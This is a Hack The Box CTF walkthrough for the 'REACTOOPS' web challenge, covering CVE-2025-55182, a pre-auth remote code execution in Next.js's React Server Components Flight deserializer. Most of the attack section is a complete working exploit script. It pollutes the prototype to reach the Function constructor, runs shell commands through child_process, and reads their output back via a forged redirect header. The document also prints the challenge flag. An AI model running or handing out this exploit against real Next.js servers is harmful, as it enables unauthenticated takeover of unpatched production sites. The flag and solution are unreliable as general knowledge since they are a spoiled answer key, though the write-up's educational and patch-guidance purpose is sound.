# REACTOOPS - HTB CTF Walkthrough

| Field | Value |
|---|---|
| Challenge type | Web application |
| Tech stack | Next.js 16.0.6 (App Router), React 19, standalone server output |
| Flag location | `/app/flag.txt`, read as root inside the container |
| Vulnerability chain | Pre-auth RCE via React Server Components Flight deserializer prototype pollution |
| CVE | CVE-2025-55182 ("react2shell") |
| Flag | `HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}` |

---

## Key Technologies - What They Are

**Next.js App Router / Server Actions** - Next.js lets a client component call a function that only runs on the server ("Server Action"), invoked via a normal HTTP POST carrying a `Next-Action` header identifying which action to run.

**React Server Components (RSC) Flight protocol** - The serialization format Next.js uses to encode Server Action arguments and return values into a request/response body. It supports references like `$1:path:to:prop`, letting one serialized value point into another already-parsed object graph, so the client and server can reconstruct rich object trees (including promises) across the wire.

**Prototype pollution** - A class of bug where attacker-controlled data lets you write properties onto `Object.prototype` (or otherwise reach objects/functions that were never meant to be attacker-reachable), because a deserializer or merge function walks a property path without checking that each segment is an object's own property.

---

## Architecture

The provided source is a plain marketing landing page (`app/page.tsx`, `app/layout.tsx`) for a fictional "NexusAI" assistant product, with no custom API routes, no custom Server Actions, and no custom middleware. `package.json` pins:

```json
"dependencies": {
  "next": "16.0.6",
  "react": "^19",
  "react-dom": "^19"
}
```

and the package's `"name"` field is literally `"react2shell"` - a direct pointer to a specific, named Next.js vulnerability rather than app-specific logic. Since there is no app code that defines any Server Action, the vulnerable code path lives entirely inside Next.js's own built-in action-dispatch machinery, meaning any Next.js 16.0.6 App Router deployment is exploitable out of the box, with zero custom server-side code required.

---

## Vulnerability Chain Summary

```
Step 1: Confirm Next.js 16.0.6 (App Router, standalone build) from package.json
Step 2: Identify CVE-2025-55182, a pre-auth RCE in the RSC Flight deserializer
         affecting Next.js 15.x/16.x, fixed in 16.0.7
Step 3: Send a single unauthenticated POST / with a Next-Action header and a
         crafted multipart Flight payload that:
           - references Object.prototype via a "$1:__proto__:then" path
           - injects a fake "then" handler that runs attacker JS
           - reaches the Function constructor via "$1:constructor:constructor"
Step 4: Exfiltrate command output via a forged NEXT_REDIRECT digest that
         encodes the result in the 303 redirect's Location header
Step 5: Confirm code execution as root, read /app/flag.txt
```

---

## Bug - RSC Flight Deserializer Prototype Pollution to RCE (CVE-2025-55182)

### Root cause

The Flight deserializer resolves reference strings such as `$1:__proto__:then` by walking each path segment and indexing into the target object without verifying the segment is an *own* property of that object. Walking `__proto__` therefore reaches `Object.prototype` itself rather than being blocked. By supplying a value whose `then` property is set via this path, an attacker can make the deserializer treat an arbitrary object as a "thenable" - a promise-like object with a `.then()` method.

When the deserializer later resolves that "thenable," it invokes the attacker-supplied `then` handler as if it were legitimate promise-resolution logic. Continuing the property-path trick to `$1:constructor:constructor` reaches the built-in `Function` constructor, letting the payload compile and execute arbitrary JavaScript inside the Node.js server process - a full pre-auth RCE, with no valid Server Action ID and no application-defined action required at all.

### The payload

A single POST to `/` with a `Next-Action` header (its value does not need to correspond to a real action) and a multipart body encoding the malicious Flight object graph:

```javascript
const payloadMap = {
  then: '$1:__proto__:then',
  status: 'resolved_model',
  reason: -1,
  value: '{"then":"$B1337"}',
  _response: {
    _prefix: injectedJsSourceString,
    _chunks: '$Q2',
    _formData: {
      get: '$1:constructor:constructor',
    },
  },
}
```

- `then: '$1:__proto__:then'` walks into `Object.prototype` to plant a fake `then`.
- `_formData: { get: '$1:constructor:constructor' }` reaches `Function` via the constructor-of-constructor trick.
- `_prefix` holds the actual JavaScript source that gets compiled and run as the resolve handler.

### Exfiltration without a stdout channel

The injected JavaScript does not have a direct output channel back to the attacker, so the PoC abuses Next.js's redirect mechanism: throwing an `Error` whose `digest` is set to a `NEXT_REDIRECT;push;<path>;<code>;` string makes Next.js treat it as a legitimate framework-level redirect and emit a `303`/`307` response with that path in the `Location` header. Encoding the command's output as a query parameter on that redirect path turns an internal exception into a readable exfiltration channel:

```javascript
var res = (function () {
  try {
    return process.mainModule.require('child_process').execSync('id').toString()
  } catch (e) {
    return 'CMD ERROR: ' + e.message
  }
})();
throw Object.assign(new Error('NEXT_REDIRECT'), {
  digest: 'NEXT_REDIRECT;push;/login?a=' + encodeURIComponent(res) + ';307;',
});
```

The response's `Location` header then contains `id`'s output directly, no persistent shell or reverse connection needed.

### Full exploit script

```javascript
import process from 'node:process'

const targetUrl = process.argv[2] || 'http://reactoops.htb:31888'
const cmd = process.argv[3] || 'id'

async function sendRce(actionId, jsCode) {
  const injection =
    `var res=${jsCode};` +
    `if(typeof res!=='string'){try{res=JSON.stringify(res,null,2)}catch(e){res='[JSON Error]'}};` +
    `throw Object.assign(new Error('NEXT_REDIRECT'),{digest: 'NEXT_REDIRECT;push;/login?a=' + encodeURIComponent(res) + ';307;'});`

  const payloadMap = {
    then: '$1:__proto__:then',
    status: 'resolved_model',
    reason: -1,
    value: '{"then":"$B1337"}',
    _response: {
      _prefix: injection,
      _chunks: '$Q2',
      _formData: {
        get: '$1:constructor:constructor',
      },
    },
  }

  const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2)
  const parts = [
    `--${boundary}\r\nContent-Disposition: form-data; name="0"\r\n\r\n${JSON.stringify(payloadMap)}`,
    `--${boundary}\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"`,
    `--${boundary}\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]`,
    `--${boundary}--`,
  ]
  const body = parts.join('\r\n')

  const headers = {
    'Content-Type': `multipart/form-data; boundary=${boundary}`,
    'Next-Action': actionId,
    'X-Nextjs-Request-Id': `rce-${Math.floor(Math.random() * 9000) + 1000}`,
  }

  const response = await fetch(targetUrl, { method: 'POST', headers, body, redirect: 'manual' })
  const text = await response.text()
  console.log('STATUS:', response.status)
  let rawLocation = response.headers.get('location') || response.headers.get('x-action-redirect') || text
  console.log('LOCATION HEADER:', response.headers.get('location'))
  const match = rawLocation.match(/[?&]a=([^;&\s"]+)/)
  if (match) {
    console.log('RESULT:', decodeURIComponent(match[1]))
  } else {
    console.log('RAW TEXT (first 1000):', text.substring(0, 1000))
  }
}

const jsCode = `
  (function () {
    try {
      return process.mainModule.require('child_process').execSync('${cmd.replace(/'/g, "\\'")}').toString()
    } catch (e) {
      return 'CMD ERROR: ' + e.message
    }
  })()
`.trim()

await sendRce('dontcare', jsCode)
```

Usage:

```bash
node exploit.mjs http://reactoops.htb:31888 "id"
node exploit.mjs http://reactoops.htb:31888 "cat /app/flag.txt"
```

`id` returned `uid=0(root)`, and `cat /app/flag.txt` returned the flag directly.

---

## Root Cause

CVE-2025-55182 is a CVSS 10.0 pre-auth RCE in Next.js's RSC Flight deserializer, affecting the 15.x and 16.x App Router lines, fixed in 16.0.7. The bug is entirely inside Next.js itself: the deserializer's reference-path resolution does not distinguish own properties from inherited ones, so a path like `__proto__` is followed exactly like any other property name, giving an attacker a route from arbitrary serialized input to `Object.prototype`, then to `Function`, then to native code execution. No application-level Server Action, API route, or custom logic is required to trigger it, so simply running an unpatched Next.js version with App Router enabled is sufficient for full compromise. The fix is to upgrade to 16.0.7 or later, where the deserializer validates that each resolved path segment is an own property before continuing the walk.

---

## Flag

```
HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}
```
